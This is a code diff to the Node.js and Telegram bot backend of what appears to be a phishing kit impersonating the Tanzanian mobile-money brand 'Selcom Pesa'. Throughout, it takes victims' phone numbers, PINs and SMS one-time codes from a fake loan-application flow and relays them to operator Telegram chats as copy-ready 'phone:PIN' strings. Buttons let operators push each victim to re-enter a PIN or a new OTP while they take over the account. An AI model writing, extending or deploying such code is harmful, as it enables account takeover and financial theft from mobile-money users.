@@ -1,5 +1,5 @@
 /**
- * SELCOM TANZANIA - PRIVATE SUB-ADMIN ROUTED SERVER
+ * SELCOM PESA - PRIVATE SUB-ADMIN TELEGRAM SERVER
  */
 
 const express = require('express');
@@ -72,23 +72,15 @@ async function initBot() {
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
+      const isMainAdmin = (chatId === String(FALLBACK_ADMIN_ID));
 
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        const mainAdminMessage = `👑 *Selcom Admin Principal*\n\n` +
-                                 `👤 *Jina:* ${firstName} ${lastName}\n` +
-                                 `• Chat ID: \`${chatId}\`\n\n` +
-                                 `🔗 *Linki yako binafsi:*\n${userLink}`;
-        await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
-        return;
-      }
+      const adminMessage = `🤖 *Selcom Pesa - Private Sub-Admin Portal*\n\n` +
+                           `👤 *Telegram Info:*\n` +
+                           `• Name: ${firstName}\n` +
+                           `• Chat ID: \`${chatId}\`\n\n` +
+                           `🔗 *Your Exclusive Personal Link:*\n${userLink}`;
 
-      const subAdminMessage = `🤖 *SEHEMU YA MSAIDIZI WA SELCOM (SUB-ADMIN)*\n\n` +
-                              `👤 *Jina:* ${firstName} ${lastName}\n` +
-                              `• Chat ID: \`${chatId}\`\n\n` +
-                              `🔗 *Linki yako binafsi ya kufuatilia:*\n${userLink}\n\n` +
-                              `_Wateja wako watakuja moja kwa moja hapa._`;
-
-      await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, adminMessage, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -107,33 +99,32 @@ async function initBot() {
 
       switch (actionType) {
         case 'DENY_CREDS':
+          session.status = 'DENIED';
+          await bot.sendMessage(chatTarget, `❌ Application denied successfully.`);
+          break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ PIN imekataliwa. Mteja anaombwa kuweka PIN sahihi upya.`);
+          await bot.sendMessage(chatTarget, `❌ WRONG PIN ❌. Client redirected to re-enter PIN.`);
           break;
         case 'ALLOW_CREDS':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Umeingia vizuri (ALLOW). Mteja ameelekezwa kwenye hatua ya OTP.`);
+          await bot.sendMessage(chatTarget, `✅ Connection allowed. Client proceeding to 6-digit OTP verification.`);
           break;
-        case 'EXPIRED_OTP':
+        case 'OTP_EXPIRES':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `❌ OTP imewekwa kama imeisha muda wake (EXPIRED OTP). Mteja ameelezwa kusubiri SMS mpya.`);
-          break;
-        case 'REQUEST_NEW_OTP':
-          session.status = 'REQUEST_NEW_OTP';
-          await bot.sendMessage(chatTarget, `🔄 Mteja ameomba nambari mpya ya OTP.`);
+          await bot.sendMessage(chatTarget, `⚠️ OTP EXPIRES. Client redirected to enter new OTP.`);
           break;
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu! Ukurasa wa mafanikio umeonyeshwa kwa mteja.`);
+          await bot.sendMessage(chatTarget, `🎉 APPROVAL successful! Success screen displayed to client.`);
           break;
         default:
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Imekamilika` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Action executed` }).catch(() => {});
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
@@ -161,18 +152,18 @@ app.post('/api/submit-credentials', async (req, res) => {
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🔴 **NEW SELCOM APPLICANT**\n\n` +
-                    `📱 *Nambari ya Simu:* \`${phone}\`\n` +
-                    `🔒 *Nambari ya PIN:* \`${pin}\`\n\n` +
-                    `📋 *Fomati ya kunakili:*\n\`${phone}:${pin}\``;
+    const message = `🔴 *SELCOM PESA - PHONE NO & PIN*\n\n` +
+                    `📞 *Phone Number:* \`${phone}\`\n` +
+                    `🔒 *PIN:* \`${pin}\`\n\n` +
+                    `📋 *Quick Copy:*\n\`${phone}:${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` },
-            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` }
+            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` },
+            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` }
           ]
         ]
       }
@@ -184,7 +175,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     
     return res.status(200).json({ success: true, userId });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Tatizo la mtandao.' });
+    return res.status(500).json({ success: false, error: 'Network error.' });
   }
 });
 
@@ -195,7 +186,21 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 6-digit OTP
+// Request new OTP notification
+app.post('/api/request-new-otp', async (req, res) => {
+  try {
+    const { userId } = req.body || {};
+    const session = sessions.get(userId);
+    if (session && session.adminChatId && bot) {
+      await bot.sendMessage(session.adminChatId, `🔄 Client requested a NEW OTP code for phone: \`${session.phone}\``, { parse_mode: 'Markdown' });
+    }
+    return res.status(200).json({ success: true });
+  } catch (e) {
+    return res.status(500).json({ success: false });
+  }
+});
+
+// Step 2: Submit 6-digit SMS OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -205,19 +210,21 @@ app.post('/api/submit-otp', async (req, res) => {
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
+    const applicantPhone = session.phone || 'Unknown';
 
-    const message = `🔴 **OTP VERIFICATION**\n\n` +
-                    `📱 *Nambari ya Simu:* \`${session.phone}\`\n` +
-                    `🔑 *Msimbo wa OTP (Tarakimu 6):* \`${otp}\``;
+    const message = `🔴 *SELCOM PESA - 6-DIGIT OTP*\n\n` +
+                    `📞 *Applicant:* \`${applicantPhone}\`\n` +
+                    `📱 *OTP Code:* \`${otp}\`\n\n` +
+                    `📋 *Quick Copy:*\n\`${applicantPhone}:${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
-            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
-            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
+            { text: 'OTP EXPIRES', callback_data: `OTP_EXPIRES_${userId}` },
+            { text: 'APPROVAL', callback_data: `APPROVED_FINAL_${userId}` }
           ]
         ]
       }
@@ -227,41 +234,7 @@ app.post('/api/submit-otp', async (req, res) => {
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Tatizo' });
-  }
-});
-
-// Request New OTP Handler
-app.post('/api/request-new-otp', async (req, res) => {
-  try {
-    const { userId } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
-
-    const targetChat = session.adminChatId;
-    session.status = 'WAITING_OTP_VERIFICATION';
-
-    const message = `⚠️ **OMBI LA OTP MPYA**\n\n` +
-                    `📱 *Nambari ya Simu:* \`${session.phone}\`\n` +
-                    `Mteja ameomba kutumiwa nambari mpya ya OTP baada ya muda kuisha.`;
-
-    const opts = {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
-            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
-            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
-          ]
-        ]
-      }
-    };
-
-    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
-    return res.status(200).json({ success: true });
-  } catch (err) {
-    return res.status(500).json({ success: false, error: 'Tatizo' });
+    return res.status(500).json({ success: false, error: 'Error' });
   }
 });
 
@@ -270,4 +243,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-        
+  
